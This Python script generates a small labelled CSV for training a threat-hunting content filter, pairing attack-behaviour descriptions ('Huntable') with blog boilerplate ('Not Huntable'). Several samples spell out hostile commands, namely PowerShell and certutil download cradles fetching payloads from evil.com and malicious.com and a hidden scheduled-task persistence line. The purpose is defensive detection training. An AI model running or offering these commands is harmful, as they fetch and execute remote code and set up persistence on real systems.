#!/usr/bin/env python3
"""
Create default training data for content filter ML model.

This script generates a minimal training dataset with examples of
huntable and not huntable content to bootstrap the ML model.
"""

import sys
import os
import csv
from pathlib import Path

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

def create_default_training_data(output_path: str = "models/default_content_filter_training_data.csv"):
    """Create default training data CSV file."""
    
    # Ensure output directory exists
    Path(output_path).parent.mkdir(parents=True, exist_ok=True)
    
    # Default training examples - mix of huntable and not huntable content
    training_examples = [
        # Huntable examples
        {
            "highlighted_text": "Post exploitation Huntress has observed threat actors using encoded PowerShell to download and sideload DLLs via cradle techniques. Command: powershell.exe -encodedCommand BASE64PAYLOAD== Cleartext: Invoke-WebRequest -uri http://malicious.com/payload.dll -outfile C:\\Users\\Public\\payload.dll",
            "classification": "Huntable"
        },
        {
            "highlighted_text": "Registry modification detected: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware. Process tree: cmd.exe -> powershell.exe -> wscript.exe. Event ID 4688 logged for process creation.",
            "classification": "Huntable"
        },
        {
            "highlighted_text": "Threat actor executed schtasks /create /tn UpdateTask /tr 'C:\\Windows\\System32\\cmd.exe /c powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\"http://evil.com/script.ps1\")' /sc onlogon",
            "classification": "Huntable"
        },
        {
            "highlighted_text": "Suspicious process chain: mshta.exe spawned from rundll32.exe, which was launched by regsvr32.exe. Network connection to 192.168.1.100:4444 established. File dropped at C:\\Users\\Public\\temp\\malware.exe",
            "classification": "Huntable"
        },
        {
            "highlighted_text": "Command-line execution: certutil.exe -urlcache -split -f http://malicious.com/file.exe C:\\temp\\file.exe. Followed by execution of dropped file. Windows Defender alert triggered.",
            "classification": "Huntable"
        },
        {
            "highlighted_text": "Event ID 4624: Successful logon from external IP. Event ID 4688: Process creation for suspicious.exe. Event ID 5145: Network share accessed. Registry key modified: HKLM\\SYSTEM\\CurrentControlSet\\Services\\MalwareService",
            "classification": "Huntable"
        },
        {
            "highlighted_text": "PowerShell execution with obfuscation: $a='Invoke-WebRequest'; $b='http://evil.com/payload'; & $a -Uri $b -OutFile 'C:\\temp\\malware.dll'. DLL sideloading via legitimate signed binary.",
            "classification": "Huntable"
        },
        {
            "highlighted_text": "Process injection detected: malware.exe injected into svchost.exe. Memory allocation and execution of shellcode. Network beacon to C2 server at 10.0.0.50:8080. Persistence via scheduled task.",
            "classification": "Huntable"
        },
        {
            "highlighted_text": "WMI event subscription created for persistence: __EventFilter and __EventConsumer configured. Command execution via wmic process call create. Registry run key added for startup persistence.",
            "classification": "Huntable"
        },
        {
            "highlighted_text": "Lateral movement: psexec.exe used to execute commands on remote host 192.168.1.50. Credential theft via mimikatz. LSASS memory dump created. Pass-the-hash attack detected.",
            "classification": "Huntable"
        },
        
        # Not Huntable examples
        {
            "highlighted_text": "Thank you for reading this article. We hope you found the information useful. For more security updates, please subscribe to our newsletter. Contact us at security@example.com for questions or feedback.",
            "classification": "Not Huntable"
        },
        {
            "highlighted_text": "About the Author: John Doe is a cybersecurity expert with over 15 years of experience in threat intelligence and incident response. He holds multiple certifications including CISSP and GCIH.",
            "classification": "Not Huntable"
        },
        {
            "highlighted_text": "This article is part of our ongoing series on cybersecurity best practices. Stay tuned for more content covering topics such as network security, endpoint protection, and security awareness training.",
            "classification": "Not Huntable"
        },
        {
            "highlighted_text": "Disclaimer: The information provided in this article is for educational purposes only. The authors and publishers are not responsible for any misuse of the information contained herein.",
            "classification": "Not Huntable"
        },
        {
            "highlighted_text": "Related Articles: Check out our other posts on threat hunting, malware analysis, and security operations. Follow us on Twitter @SecurityBlog for daily updates and security news.",
            "classification": "Not Huntable"
        },
        {
            "highlighted_text": "We would like to thank our sponsors and partners for their continued support. This research was made possible through collaboration with leading security vendors and the open-source community.",
            "classification": "Not Huntable"
        },
        {
            "highlighted_text": "For media inquiries, please contact our press team at press@example.com. We are available for interviews and speaking engagements at security conferences worldwide.",
            "classification": "Not Huntable"
        },
        {
            "highlighted_text": "Copyright 2024 Security Research Blog. All rights reserved. This content may not be reproduced without written permission. For licensing inquiries, contact licensing@example.com.",
            "classification": "Not Huntable"
        },
        {
            "highlighted_text": "Subscribe to our RSS feed to receive the latest articles automatically. You can also follow us on LinkedIn, Twitter, and GitHub for updates and community discussions.",
            "classification": "Not Huntable"
        },
        {
            "highlighted_text": "This article has been updated to reflect the latest threat intelligence and security research findings. Previous versions may contain outdated information. Last updated: January 2024.",
            "classification": "Not Huntable"
        },
    ]
    
    # Write CSV file
    with open(output_path, 'w', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=['record_number', 'highlighted_text', 'classification', 'article_title', 'classification_date'])
        writer.writeheader()
        
        for i, example in enumerate(training_examples, start=1):
            writer.writerow({
                'record_number': i,
                'highlighted_text': example['highlighted_text'],
                'classification': example['classification'],
                'article_title': 'Default Training Data',
                'classification_date': '2024-01-01'
            })
    
    print(f"✅ Created default training data: {output_path}")
    print(f"   - Total examples: {len(training_examples)}")
    print(f"   - Huntable: {sum(1 for e in training_examples if e['classification'] == 'Huntable')}")
    print(f"   - Not Huntable: {sum(1 for e in training_examples if e['classification'] == 'Not Huntable')}")
    
    return output_path

if __name__ == "__main__":
    output_file = sys.argv[1] if len(sys.argv) > 1 else "models/default_content_filter_training_data.csv"
    create_default_training_data(output_file)
